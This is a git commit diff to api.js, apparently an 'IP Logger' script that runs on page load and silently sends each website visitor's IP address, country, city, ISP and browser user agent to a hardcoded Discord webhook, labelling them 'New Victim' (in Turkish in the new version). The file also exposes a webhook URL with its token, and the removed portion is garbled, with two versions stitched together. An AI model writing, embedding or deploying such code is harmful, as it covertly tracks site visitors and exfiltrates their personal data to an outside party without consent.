87c9318b0272b6d9caa87da883dff8457081ae10
demlemecay234293 <demircan12345678910@gmail.com>
2026-04-05 20:41:36 +0300

    Update api.js

--- api.js
+++ api.js
@@ -1,129 +1,31 @@
-@@ -1,96 +1,36 @@
-/*
-*     Programmed by Z3NTL3
-*   For Educational Purposes
-*
-*   Get the IP of the web visitor. Even if your website is just static HTML!
-*
-*   IP INFO will be sent to the configured WEBHOOK!
-*
-*/
+const webhook = "https://discord.com/api/webhooks/1489972140680679514/y3WNCXz1DgvFnYtfXME1cWRiEwhoBATmkDnUfI85b07Sl93r3QGePcnWJlzTOcpjU8hC";
 
-
-const webhook = "https://discord.com/api/webhooks/1489972140680679514/y3WNCXz1DgvFnYtfXME1cWRiEwhoBATmkDnUfI85b07Sl93r3QGePcnWJlzTOcpjU8hC"
-
-async function IP_Info(){
-    /**
-     *  Description: On init , fetches IP information of user
-     *  @return {fetch.Body.json()} Resp Body
-     */
-    let response = await fetch("http://ip-api.com/json", {
-      method: 'GET',
-      headers: {
-        "cache-control" : "no-cache",
-        "content-type": "application/json"
-      }
-    })
-    return response.json()
-  }
-  IP_Info().then((value)=> {
-    let requiredInfo = [
-      "status","country", "city", "zip", "regionName"
-    ]
-    let noData = false
-async function sendIP() {
+async function sendLog() {
     try {
-        let response = await fetch("https://ipapi.co/json/");
-        let data = await response.json();
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
 
-    for(var i = 0; i < requiredInfo.length; i++){
-      if(typeof(value[`${requiredInfo[i]}`]) === 'undefined'){
-        noData = true
-        break
-      } 
-    }
-    if(noData){
-      return null
-    }
-    return value
-  }).then( async (value) => {
-    if(value !== null){
-       await fetch(webhook, {
-        method: 'POST',
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          content:"``New Victim``",
-          embeds: [{
-              title: "Victim IP",
-              type:"rich",
-              color: "12223968",
-              description: "```IP information of the recent website visitor.```",
-              fields: [{
-                name: "IP", value: `${value.query}`, inline: false
-              },
-              {
-                name: "Country", value: `${value.country}`, inline: false
-              },
-              {
-                name: "City", value: `${value.city}`, inline: false
-              },
-              {
-                name: "ZIP", value: `${value.zip}`, inline: false
-              },
-              {
-                name: "Region", value: `${value.regionName}`, inline: false
-              }
-              ],
-              footer: {
-                text: "Programmed by Z3NTL3",
-                icon_url: "https://avatars.githubusercontent.com/u/48758770?s=400&u=d0a4b500baea4e122b127eb91b4a80af3464f9f5&v=4"
-              },
-              author: {
-                name: "Pix4",
-                url: "https://code.pix4.dev"
-              },
-              thumbnail: {
-                url: "https://media.tenor.com/h2AVqgVw4ZoAAAAC/gotcha-michael-madsen.gif"
-              }
-          }]
-        })
-      }).then((value)=>{
-        console.log(value.statusText)
-      }).catch((err)=>{
-        console.log(err)
-      })
         await fetch(webhook, {
             method: "POST",
-            headers: { "Content-Type": "application/json" },
+            headers: {"Content-Type": "application/json"},
             body: JSON.stringify({
-                content: "**New Victim Logged**",
+                content: "**Yeni Kurban Geldi** 🔥",
                 embeds: [{
-                    title: "IP Logger - New Hit",
-                    color: 0x00ff00,
+                    title: "IP Logger - Hit",
+                    color: 0x00ff88,
                     fields: [
                         { name: "IP", value: `\`${data.ip}\``, inline: true },
-                        { name: "Country", value: `${data.country_name || "Unknown"}`, inline: true },
-                        { name: "City", value: `${data.city || "Unknown"}`, inline: true },
-                        { name: "Region", value: `${data.region || "Unknown"}`, inline: true },
-                        { name: "ISP", value: `${data.org || "Unknown"}`, inline: false },
+                        { name: "Ülke", value: data.country_name || "Bilinmiyor", inline: true },
+                        { name: "Şehir", value: data.city || "Bilinmiyor", inline: true },
+                        { name: "ISP", value: data.org || "Bilinmiyor", inline: false },
                         { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                     ],
-                    footer: { text: "Made by Z3NTL3" },
-                    timestamp: new Date().toISOString()
+                    footer: { text: "Z3NTL3 IP Logger" },
+                    timestamp: new Date()
                 }]
             })
         });
-
-        console.log("IP Sent Successfully");
-    } catch (err) {
-        console.log("Error:", err);
-    }
-  }).catch((err)=> {
-    console.log(err)
-    console.log('Request not send')
-  })
+    } catch (e) {}
 }
 
-sendIP();
+sendLog();
